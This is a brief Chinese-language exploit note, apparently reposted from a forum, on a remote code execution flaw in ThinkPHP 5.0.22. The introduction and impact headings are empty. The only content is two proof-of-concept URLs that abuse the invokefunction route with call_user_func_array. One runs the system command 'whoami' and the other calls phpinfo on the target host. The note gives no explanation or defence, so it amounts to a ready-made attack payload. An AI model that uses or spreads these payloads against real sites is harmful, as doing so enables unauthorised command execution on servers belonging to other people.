# Thinkphp 5.0.22

> 原文：[https://www.zhihuifly.com/t/topic/3155](https://www.zhihuifly.com/t/topic/3155)

# Thinkphp 5.0.22

## 一、漏洞简介

## 二、漏洞影响

## 三、复现过程

### 1、poc

```
http://0-sec.org/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami 
```

### 2、poc

```
http://0-sec.org/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 
```